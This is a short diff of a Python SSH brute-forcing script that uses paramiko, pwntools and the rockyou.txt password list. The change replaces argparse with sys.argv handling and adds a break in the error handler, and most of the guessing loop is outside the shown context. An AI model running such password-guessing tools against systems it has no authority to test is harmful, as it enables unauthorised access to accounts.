@@ -1,17 +1,14 @@
-from logging import exception
-from socket import timeout
-import argparse
+import sys
 import string
 from pwn import *
 import paramiko
 
-parser = argparse.ArgumentParser(description="[*] Use : python3 ssh-brute-forcing.py <host> <user>")
-parser.add_argument('--host', type=string)
-parser.add_argument('--user', type=string)
+if len(sys.argv) < 3:
+    print("[*] Use : python3 ssh-brute-forcing.py <host> <user>")
+    sys.exit(1)
 
-args = parser.parse_args()
-host = args.host
-username = args.user
+host = sys.argv[1]
+username = sys.argv[2]
 
 
 with open("rockyou.txt", "r") as password_list:
@@ -25,6 +22,4 @@ with open("rockyou.txt", "r") as password_list:
                 break
         except:
             print("The data assigned for connection is incorrect!")
-        
-
-        
+            break 
